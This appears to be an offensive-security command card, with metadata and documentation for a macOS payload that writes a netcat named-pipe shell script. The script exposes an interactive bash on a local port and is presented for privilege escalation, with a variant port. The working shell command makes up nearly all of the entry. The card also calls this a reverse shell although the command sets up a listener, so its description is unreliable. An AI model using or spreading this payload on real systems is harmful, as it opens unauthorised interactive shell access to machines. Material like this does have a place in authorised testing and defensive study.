---
data: >-
  echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo
  2>&1" > shell
tags:
  - payload
  - reverse-shell
type: command
output: File 'shell' containing the script
executor: bash
platforms:
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.004Z'
id: c24fac73-878f-4326-8d3c-23db47e4cce2
verified: false
validated: true
submitted: true
---
# create-reverse-shell-script

## Command

```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell
```

## Description

Creates a shell script file that sets up a FIFO-based reverse shell listener using netcat on localhost port 8080, enabling interactive bash access for privilege escalation exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> shell` | Redirects output to file 'shell' | Yes |
| `mkfifo myfifo` | Creates named pipe for I/O | Embedded |
| `nc -l 127.0.0.1 8080` | Netcat listen on localhost:8080 | Embedded |
| `< myfifo | /bin/bash -i > myfifo 2>&1` | Pipes interactive bash through FIFO | Embedded |

## Examples

### Basic Usage

```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell
```

### Advanced Usage

Modify port: `echo "mkfifo myfifo;nc -l 127.0.0.1 4444 < myfifo | /bin/bash -i > myfifo 2>&1" > shell`

## Expected Output

The file 'shell' is created with the script contents. Verify: `cat shell` shows the commands.

## Related

- [[commands/connect-to-reverse-shell]]
- [[procedures/Prepare-Reverse-Shell-Payload]]
